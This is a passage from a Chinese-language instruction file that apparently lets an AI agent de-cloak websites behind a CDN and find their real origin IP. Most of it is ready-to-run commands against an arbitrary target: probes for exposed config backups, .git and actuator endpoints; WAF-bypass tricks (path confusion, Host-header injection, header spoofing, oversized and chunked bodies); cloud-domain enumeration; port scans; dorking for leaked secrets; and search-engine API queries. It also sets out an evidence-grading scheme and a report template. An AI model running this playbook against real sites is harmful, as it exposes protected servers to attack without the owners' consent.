  "/wp-config.php.bak" "/wp-config.php~" "/wp-config.php.old" \
  "/config.php.bak" "/configuration.php.old" \
  "/phpinfo.php" "/info.php" "/test.php" "/i.php" \
  "/.git/config" "/.svn/entries" "/.DS_Store" \
  "/server-status" "/server-info" \
  "/.well-known/security.txt" \
  "/crossdomain.xml" "/clientaccesspolicy.xml" \
  "/sitemap.xml" "/robots.txt" \
  "/readme.html" "/README.md" \
  "/debug" "/trace" "/actuator/env" "/actuator/health" \
  "/.htaccess" "/web.config" \
  "/api/config" "/api/v1/config" "/api/debug" \
  "/graphql" "/.graphql" \
  "/swagger.json" "/swagger-ui.html" "/api-docs" \
  "/elmah.axd" "/error_log" "/errors.log"; do
  code=$(curl -sI -m 3 -o /dev/null -w "%{http_code}" "https://<target>$path")
  [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$path → HTTP $code"
done

# 2. JS文件中的IP/内网地址/API endpoint
curl -s "https://<target>" | grep -oP 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//' | while read js; do
  [ "${js:0:2}" = "//" ] && js="https:$js"
  [ "${js:0:1}" = "/" ] && js="https://<target>$js"
  curl -s "$js" | grep -oP '(?:https?://|//)[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[:/]?' | sort -u
  curl -s "$js" | grep -oP '(?:https?://|//)((?:api|backend|server|origin|internal|staging|dev|admin|gateway)\.[a-z0-9.-]+)' | sort -u
done

# 3. HTML注释中的IP/内网域名
curl -s "https://<target>" | grep -oP '<!--[\s\S]*?-->' | grep -oP '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'

# 4. WebSocket连接地址
curl -s "https://<target>" | grep -oP 'wss?://[^"'"'"'\s<>]+' | sort -u
```

### 14D.3 被动情报与第三方数据源

```bash
# 1. DNSDumpster — 被动DNS聚合
# WebSearch: site:dnsdumpster.com "<root_domain>"

# 2. ThreatCrowd — 威胁情报关联
# WebFetch: https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=<root_domain>

# 3. AlienVault OTX — 开源威胁情报
# WebFetch: https://otx.alienvault.com/api/v1/indicators/domain/<root_domain>/passive_dns

# 4. RiskIQ/PassiveTotal (Community版)
# WebSearch: "<root_domain>" site:community.riskiq.com

# 5. URLScan.io — 最近扫描记录中可能包含源站连接
# WebFetch: https://urlscan.io/api/v1/search/?q=domain:<root_domain>&size=10

# 6. Netcraft — 站点技术栈和历史
# WebSearch: site:netcraft.com "<root_domain>"

# 7. BuiltWith — 技术栈指纹
# WebSearch: site:builtwith.com "<root_domain>"
```

### 14D.4 云厂商元数据与内部域名探测

```bash
# 很多源站在云上部署时有内部域名(无CDN保护)
for prefix in \
  "<root_domain_no_tld>" "<root_domain_no_tld>-prod" "<root_domain_no_tld>-api" \
  "<root_domain_no_tld>-backend" "<root_domain_no_tld>-origin" "<root_domain_no_tld>-server"; do
  for suffix in \
    ".vm.elb.amazonaws.com" ".elasticbeanstalk.com" \
    ".azurewebsites.net" ".cloudapp.azure.com" \
    ".appspot.com" ".run.app" \
    ".herokuapp.com" \
    ".myqcloud.com" ".ap-guangzhou.myqcloud.com" ".ap-shanghai.myqcloud.com" \
    ".aliyuncs.com" ".ecs.aliyuncs.com" \
    ".huaweicloud.com" ".cce.huaweicloud.com"; do
    ip=$(nslookup "${prefix}${suffix}" 2>/dev/null | grep -A1 "Name:" | grep "Address" | awk '{print $2}')
    [ -n "$ip" ] && echo "FOUND: ${prefix}${suffix} → $ip"
  done
done

# 云厂商IP段筛选:
#   AWS:   https://ip-ranges.amazonaws.com/ip-ranges.json (筛选service=EC2)
#   Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519
#   GCP:   nslookup -type=TXT _cloud-netblocks.googleusercontent.com
#   阿里云: 47.x.x.x, 39.x.x.x, 120.x.x.x, 121.x.x.x
#   腾讯云: 101.32-35.x.x, 43.x.x.x, 49.x.x.x, 118.x.x.x
#   华为云: 117.50.x.x, 119.3.x.x, 121.37.x.x, 139.159.x.x
```

### 14D.5 WAF/防护层穿透

```bash
# 1. HTTP方法绕过 (某些WAF只拦截GET/POST)
for method in OPTIONS HEAD TRACE PUT DELETE PATCH CONNECT; do
  curl -s -X $method -m 3 -o /dev/null -w "$method → %{http_code} %{size_download}B\n" "https://<target>"
done

# 2. 路径混淆
curl -sI "https://<target>/..;/"
curl -sI "https://<target>/%2e%2e/"
curl -sI "https://<target>/.%00/"

# 3. Host头注入测试 (异常Host头可能返回源站IP)
curl -sI -H "Host: localhost" "https://<cdn_node_ip>" -k
curl -sI -H "Host: 127.0.0.1" "https://<cdn_node_ip>" -k
curl -sI -H "Host: " "https://<cdn_node_ip>" -k

# 4. X-Forwarded-For/X-Real-IP欺骗 (后端可能回显真实IP)
curl -sI -H "X-Forwarded-For: 127.0.0.1" "https://<target>"
curl -sI -H "X-Real-IP: 127.0.0.1" "https://<target>"

# 5. 大请求体绕过 (CDN/WAF对超大请求体可能不检测直接转发)
python3 -c "print('A'*1000000)" | curl -s -X POST -d @- "https://<target>" -o /dev/null -w "%{http_code} %{size_download}B"

# 6. 分块传输编码绕过
curl -s -H "Transfer-Encoding: chunked" -X POST -d "0\r\n\r\n" "https://<target>"

# 7. Content-Type混淆
curl -sI -H "Content-Type: application/json" "https://<target>"
curl -sI -H "Content-Type: multipart/form-data" "https://<target>"
```

### 14D.6 时间维度攻击

```bash
# 1. SSL证书续期监控 (Let's Encrypt 90天续期, ACME验证可能绕过CDN)
curl -sI "https://<target>/.well-known/acme-challenge/test"
# 如果返回源站特征而非CDN特征 → 存在绕过窗口

# 2. CDN配置不一致时间窗
#    某些目标在更新CDN配置时会短暂暴露源站
#    通过反复DNS查询(不同时间段)捕捉配置变更瞬间
# */5 * * * * dig +short <target> >> /tmp/dns_monitor.log

# 3. 新增子域名监控 (新上线的子域名可能还未接入CDN)
# WebFetch: https://crt.sh/?q=%25.<root_domain>&output=json
# 筛选最近7天签发的证书中出现的新子域名 → 逐一nslookup检查

# 4. CDN缓存过期窗口
#    缓存过期后回源请求可能暴露源站IP
#    监控X-Cache: MISS时的响应头

# 5. 证书透明度时间窗口
#    新证书签发时, CA验证过程可能短暂暴露源站
```

### 14D.7 社工辅助情报（被动收集）

```bash
# 1. GitHub/GitLab 代码搜索 (可能包含源站IP、配置文件)
# WebSearch: site:github.com "<root_domain>" ip OR host OR server OR origin OR backend
# WebSearch: site:github.com "<root_domain>" ".env" OR "config" OR "database_host"

# 2. Pastebin/代码分享平台
# WebSearch: site:pastebin.com "<root_domain>"
# WebSearch: site:paste.ee "<root_domain>"

# 3. 搜索引擎缓存
# WebSearch: "<root_domain>" intext:"server" intext:"nginx" OR intext:"apache" -site:<root_domain>
# WebSearch: "<root_domain>" "real ip" OR "origin ip" OR "源站" OR "真实IP"

# 4. 社交媒体/论坛泄露
# WebSearch: "<root_domain>" ip address site:reddit.com OR site:stackoverflow.com OR site:v2ex.com OR site:52pojie.cn

# 5. 安全报告/漏洞披露
# WebSearch: "<root_domain>" "HackerOne" OR "bugcrowd" OR "vulnerability" OR "漏洞"

# 6. WHOIS历史记录关联
# WebSearch: "<registrant_email>" 域名注册
# WebSearch: "<registrant_org>" 域名 备案
# 找到同一注册人的其他域名 → 查A记录 → 可能共用源站

# 7. Google Analytics/AdSense ID关联
curl -s "https://<target>" | grep -oE 'UA-[0-9]+-[0-9]+|G-[A-Z0-9]+|ca-pub-[0-9]+'
# 用提取到的ID搜索: WebSearch: "UA-XXXXXX" site → 找到使用同一统计ID的网站
```

### 14D.8 网络拓扑推断

```bash
# 1. Traceroute分析 (CDN回源路径在traceroute中可见)
traceroute <target> 2>/dev/null || tracert <target> 2>/dev/null

# 2. MTR分析 (更详细的路径信息)
mtr --report --report-cycles 5 <target> 2>/dev/null

# 3. TCP指纹比对 (不同OS的TCP实现有不同特征)
#    TTL初始值: Linux=64, Windows=128, Cisco=255
#    TCP Window Size, TCP Options顺序和值
#    CDN节点通常是Linux, 如果源站是Windows可通过TTL区分
curl -sI -m 3 "https://<target>" -w "\nTTL: local_ip=%{local_ip} remote_ip=%{remote_ip}\n"

# 4. ICMP Ping对比 (CDN节点和源站的TTL/响应时间可能有明显差异)
ping -c 3 <target> 2>/dev/null || ping -n 3 <target> 2>/dev/null

# 5. BGP路由分析
#    查看CDN节点的BGP路由, 回源路径可能暴露源站ASN
# WebFetch: https://bgp.he.net/AS<ASN>#_prefixes
```

### 14D.9 国际出口/地域差异利用

```bash
# 1. 某些CDN只覆盖特定地区, 不同地区DNS/代理可能获得不同结果
#    在线多地点DNS查询:
# WebFetch: https://check-host.net/check-dns?host=<target>
# WebFetch: https://www.whatsmydns.net/api/details?server=dns&q=<target>&type=A

# 2. IPv4 vs IPv6差异 (某些CDN仅覆盖IPv4, IPv6直连源站)
nslookup -type=AAAA <target>
# 如果有AAAA记录, curl -6 直连测试

# 3. 境外DNS解析可能跳过国内CDN
nslookup <target> 8.8.8.8
nslookup <target> 1.1.1.1
nslookup <target> 208.67.222.222
# 对比国内DNS (114.114.114.114) 结果是否不同

# 4. EDNS Client Subnet地域欺骗
dig +subnet=1.2.3.4/32 <target> @8.8.8.8    # 伪装亚洲IP
dig +subnet=8.8.8.8/32 <target> @8.8.8.8    # 伪装美国IP
# 不同地域可能返回不同CDN节点或源站IP
```

---


## §14E. 证据链S/A/B/C/X分级与贝叶斯融合 (v1.3 新增)

> **融合 FUCK-CDN 的证据分级体系**与思念的贝叶斯置信度评分，实现定性+定量双重判定。

### 14E.1 证据强度定义

| 等级 | 名称 | 典型证据 | 贝叶斯LLR映射 | 验证权重 |
|------|------|---------|-------------|---------|
| **S** | 决定性 | SSL证书序列号匹配+默认证书不同+Server头差异 | P≥0.95 直接确认 | 35%+25%+20% |
| **A** | 强佐证 | 历史DNS直接确认/IP反查绑定/空间引擎命中 | LLR +2.0~+3.0 | 20% |
| **B** | 佐证 | SPF包含/子域名解析/同C段关联/GA ID关联 | LLR +1.0~+1.8 | 10% |
| **C** | 弱线索 | 搜索引擎提及/同组织域名/JS端点/社工情报 | LLR +0.3~+0.8 | 5% |
| **X** | 已排除 | 确认CDN节点/无关服务器/已下线 | LLR -1.0~-1.5 | 排除 |

### 14E.2 置信度评级矩阵

| 置信度 | 条件 | 贝叶斯P值 | 行动 |
|--------|------|----------|------|
| **确定** | ≥1个S级证据 + ≥1个A级证据 | P≥0.95 | 直接确认源站 |
| **高度可信** | ≥2个A级证据互相印证 | 0.80≤P<0.95 | 补TLS/哈希指纹确认 |
| **可能** | 1个A级 + ≥1个B级 | 0.50≤P<0.80 | 需Shodan/FOFA补证 |
| **猜测** | 仅有B/C级线索 | P<0.50 | 排除或继续P4挖掘 |

### 14E.3 最终报告格式

```
╔══════════════════════════════════════════════════════════╗
║  CDN 真实 IP 溯源报告 (思念全能skill v1.3)                ║
║  目标: <target_domain>                                   ║
║  时间: <date>                                            ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  CDN 类型: <cdn_name> (ASN: <asn>)                       ║
║  DNS 托管: <dns_provider>                                ║
║  SSL 证书: <cert_cn> (Serial: <serial>)                  ║
║                                                          ║
╠══════════════════════════════════════════════════════════╣
║  溯源结论                                                ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  真实 IP:  <final_ip>                                    ║
║  置信度:  <confidence> (P=<percentage>%)                  ║
║  归属地:  <location>                                     ║
║  运营商:  <isp>                                          ║
║  服务器:  <server_software>                              ║
║  JA3指纹: <ja3_hash>                                     ║
║  HTTP/2:  <h2_fingerprint>                               ║
║                                                          ║
╠══════════════════════════════════════════════════════════╣
║  证据链                                                  ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  [S] SSL证书序列号匹配 + 默认证书不同                    ║
║  [A] 历史DNS: 2024-03-15 → 203.0.113.5                   ║
║  [A] FOFA: cert="target.com" → 203.0.113.5:443           ║
║  [B] SPF: v=spf1 ip4:203.0.113.5 ~all                   ║
║                                                          ║
╠══════════════════════════════════════════════════════════╣
║  已排除 IP                                               ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  [X] 104.16.1.1 — Cloudflare CDN节点 (AS13335)          ║
║  [X] 192.0.2.7 — 无关服务器 (证书不匹配)                 ║
║                                                          ║
╠══════════════════════════════════════════════════════════╣
║  执行方法 (<N>种)                                        ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  P0: SPF/MX/TXT → [B] ip4:203.0.113.5                   ║
║  P0: 历史DNS → [A] 2024-03-15: 203.0.113.5              ║
║  P1: SSL证书 → [S] 序列号匹配                            ║
║  P2: FOFA证书搜索 → [A] 203.0.113.5:443                  ║
║  §14B: Cloudflare专项 → 非代理端口无响应                 ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
```

### 14E.4 未能确定时的报告与建议

```
溯源结论: 未能确定真实 IP
已执行方法: <N>种 (P0: X种, P1: X种, P2: X种, P3: X种, P4: X种)
最佳候选: <ip> (置信度 <X>%, 因 <reason> 无法最终确认)

建议后续操作:
  1. 尝试邮件触发法(注册/找回密码)获取邮件头中的Received IP
  2. 申请Shodan/FOFA/Censys账号后补充空间引擎扫描
  3. 等待SSL证书续期(Let's Encrypt每90天), 续期时DNS验证可能暴露源站
  4. 持续监控域名DNS变更: python cdn_origin_monitor.py <target> --interval 3600
  5. CDN切换/故障时可能回退到源站A记录 → 设置DNS监控告警
  6. 社工辅助: GitHub代码搜索/Pastebin/安全报告中的泄露
  7. 时间窗口攻击: 监控ACME验证/CDN配置变更/新子域名上线
```

---


## §14F. 跨平台适配 + API Key注入 + Token优化 (v1.3 新增)

> **融合 FUCK-CDN 的工程化能力**，实现跨平台运行、API Key安全注入、Token最优消耗。

### 14F.1 跨平台适配规则

```bash
# 开始执行前检测平台:
if platform == win32:
    shell = PowerShell
    nslookup 可用, dig 通常不可用
    openssl/curl 通过 Git Bash (Bash工具) 执行
    python 命令用 python 而非 python3
    临时文件路径用 $env:TEMP 而非 /tmp
else:
    shell = Bash
    dig/host/whois 可用
    openssl/curl 直接使用
    python 命令用 python3
    临时文件路径用 /tmp

# 原则:
# - nslookup 跨平台可用, 优先使用
# - curl/openssl 统一走 Bash 工具 (Windows上Git Bash自带)
# - dig/host/whois 仅Linux/macOS可用, Windows上用nslookup或WebFetch替代
# - Python脚本中Windows用python, Linux用python3
```

### 14F.2 API Key 注入系统

```python
# API Key配置 (用户按需填入, 留空则跳过对应模块, 不报错)
API_KEYS = {
    'SHODAN_API_KEY':     '',  # Shodan 空间搜索引擎
    'FOFA_EMAIL':         '',  # FOFA 邮箱
    'FOFA_API_KEY':       '',  # FOFA API Key
    'CENSYS_API_ID':      '',  # Censys API ID
    'CENSYS_API_SECRET':  '',  # Censys API Secret
    'SECURITYTRAILS_KEY': '',  # SecurityTrails 历史DNS
    'ZOOMEYE_API_KEY':    '',  # ZoomEye 空间搜索引擎
    'QUAKE_API_KEY':      '',  # 360 Quake 空间搜索引擎
    'HUNTER_API_KEY':     '',  # 鹰图 Hunter 空间搜索引擎
    'VIRUSTOTAL_KEY':     '',  # VirusTotal 被动DNS
}

# 安全原则:
# - 用户在对话中提供Key时, 仅在内存中使用
# - 绝不写入文件、输出到屏幕、提交到git
# - Key越多精度越高, 留空则跳过对应模块不报错
# - 无Key时使用WebSearch/WebFetch替代方案
```

### 14F.3 无API Key时的替代方案

```bash
# 无Shodan Key:
# WebSearch: site:shodan.io "<root_domain>"
# WebFetch: https://www.shodan.io/search?query=ssl.cert.subject.CN%3A<root_domain>

# 无FOFA Key:
# WebSearch: fofa.info "<root_domain>" cert

# 无Censys Key:
# WebSearch: site:search.censys.io "<root_domain>"

# 无SecurityTrails Key:
# WebFetch: https://ipchaxun.com/<target>/  (免费历史DNS)
# WebFetch: https://site.ip138.com/<root_domain>/

# 无VirusTotal Key:
# WebFetch: https://www.virustotal.com/gui/domain/<root_domain>/relations
```

### 14F.4 Token优化执行策略

```
1. Token节省: P0全部并行 → 有候选即验证 → 无候选再逐级升级
   - P0命中率最高且Token极低 → 先跑P0
   - 早停: P0/P1有2+独立来源交叉确认 → 直接验证, 不跑P2/P3
   - 晚停: P2仍无候选才执行P3全部方法

2. 并行执行: 同优先级内的独立步骤并行调用工具
   - P0的6种方法全部并行
   - P1的7种方法全部并行
   - P2的8种方法(有API Key的部分)并行

3. 容错: 某平台/工具不可用时跳过, 不阻塞流程
   - dig不可用 → 用nslookup替代
   - API Key缺失 → 用WebSearch/WebFetch替代
   - 某个空间引擎超时 → 跳过, 用其他引擎

4. 频率控制: 避免短时间大量请求同一目标触发WAF
   - 请求间隔 ≥ 1秒
   - 并发数 ≤ 5
   - 空间引擎API: 每分钟 ≤ 30次

5. Key安全: API Key仅在内存中使用, 不写入任何文件

6. 合法合规: 仅用于授权安全测试、教学、CTF竞赛

7. 记录一切: 每个步骤的结果必须记录, 包括"无结果"
   - 便于复盘和证据链构建
   - 便于后续补充验证
```

### 14F.5 空间搜索引擎API Cookbook (8引擎 · v1.3整合)

```bash
# === Shodan ===
# 按证书CN搜索
curl -s "https://api.shodan.io/shodan/host/search?key=${SHODAN_API_KEY}&query=ssl.cert.subject.CN:%22<root_domain>%22"
# 按HTTP标题搜索
curl -s "https://api.shodan.io/shodan/host/search?key=${SHODAN_API_KEY}&query=http.title:%22<page_title>%22"
# 按favicon hash搜索
curl -s "https://api.shodan.io/shodan/host/search?key=${SHODAN_API_KEY}&query=http.favicon.hash:<favicon_murmur3>"
# 验证候选IP详情
curl -s "https://api.shodan.io/shodan/host/<candidate_ip>?key=${SHODAN_API_KEY}"

# === FOFA ===
# 按证书搜索 (排除CDN)
Q=$(echo -n 'cert="<root_domain>" && header!="cf-ray" && header!="x-amz-cf"' | base64)
curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL}&key=${FOFA_API_KEY}&qbase64=${Q}&size=100&fields=ip,port,title,server,domain"
# 按favicon mmh3 hash搜索
Q=$(echo -n 'icon_hash="<mmh3_hash>"' | base64)
curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL}&key=${FOFA_API_KEY}&qbase64=${Q}&size=100&fields=ip,port,title,server,domain"
# 按body关键字搜索
Q=$(echo -n 'body="<unique_keyword>"' | base64)
curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL}&key=${FOFA_API_KEY}&qbase64=${Q}&size=100&fields=ip,port,title,server,domain"

# === Censys ===
# 按证书CN搜索
curl -s -u "${CENSYS_API_ID}:${CENSYS_API_SECRET}" \
  "https://search.censys.io/api/v2/hosts/search?q=services.tls.certificates.leaf_data.subject.common_name%3A<root_domain>&per_page=50"
# 按证书SHA256搜索
curl -s -u "${CENSYS_API_ID}:${CENSYS_API_SECRET}" \
  "https://search.censys.io/api/v2/hosts/search?q=services.tls.certificates.leaf_data.fingerprint%3A<cert_sha256>&per_page=50"

# === ZoomEye ===
curl -s -H "API-KEY: ${ZOOMEYE_API_KEY}" \
  "https://api.zoomeye.org/host/search?query=ssl.cert.subject.cn%3A<root_domain>&page=1"

# === 360 Quake ===
curl -s -X POST "https://quake.360.net/api/v3/search/quake_service" \
  -H "X-QuakeToken: ${QUAKE_API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"query":"cert:\"<root_domain>\"","start":0,"size":50}'

# === 鹰图 Hunter ===
Q=$(echo -n 'cert.subject.cn="<root_domain>"' | base64)
curl -s "https://hunter.qianxin.com/openApi/search?api-key=${HUNTER_API_KEY}&search=${Q}&page=1&page_size=100"

# === SecurityTrails ===
curl -s "https://api.securitytrails.com/v1/history/<root_domain>/dns/a" \
  -H "APIKEY: ${SECURITYTRAILS_KEY}"

# === VirusTotal ===
curl -s "https://www.virustotal.com/api/v3/domains/<root_domain>/resolutions" \
  -H "x-apikey: ${VIRUSTOTAL_KEY}"
```

### 14F.6 Favicon Hash 计算 (跨平台)

```bash
# 下载favicon
curl -sL -m 10 -o /tmp/fav.ico "https://<target>/favicon.ico" \
  -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# 计算hash (跨平台Python)
python -c "
import hashlib,base64,struct,sys
try:
    with open('/tmp/fav.ico','rb') as f: data=f.read()
    if len(data)<100: print('WARN: too small, likely error page'); sys.exit(1)
    b64=base64.encodebytes(data)
    try:
        import mmh3
        print(f'FOFA: icon_hash=\"{mmh3.hash(b64)}\"')
    except ImportError:
        print('mmh3 not installed, try: pip install mmh3')
    print(f'MD5: {hashlib.md5(data).hexdigest()}')
    print(f'SHA256: {hashlib.sha256(data).hexdigest()}')
except Exception as e: print(f'Error: {e}')
"
```

### 14F.7 多端口扫描验证

```bash
CANDIDATE="<candidate_ip>"
for port in 80 81 443 2052 2053 2082 2083 2086 2087 2095 2096 \
            3000 4443 5000 8000 8001 8008 8080 8081 8443 8880 8888 9000 9090 9443; do
  r=$(curl -sI -m 2 -k https://$CANDIDATE:$port 2>&1 | head -1)
  [ -n "$r" ] && ! echo "$r"|grep -q "curl:" && echo "HTTPS:$port $r"
  r=$(curl -sI -m 2 http://$CANDIDATE:$port 2>&1 | head -1)
  [ -n "$r" ] && ! echo "$r"|grep -q "curl:" && echo "HTTP:$port  $r"
done
```

### 14F.8 IP反查确认

```bash
# 对每个候选IP进行反查
# WebFetch: https://ipchaxun.com/<candidate_ip>/
#   → 提取该IP的归属地、运营商、以及绑定过的所有域名列表
# WebFetch: https://site.ip138.com/<candidate_ip>/
#   → 提取该IP绑定过的所有域名及时间

# /24邻居扫描 (同C段关联域名)
Q=$(echo -n 'ip="<candidate_ip>/24"' | base64)
curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL}&key=${FOFA_API_KEY}&qbase64=${Q}&size=100&fields=ip,port,title,server,domain"
```

---

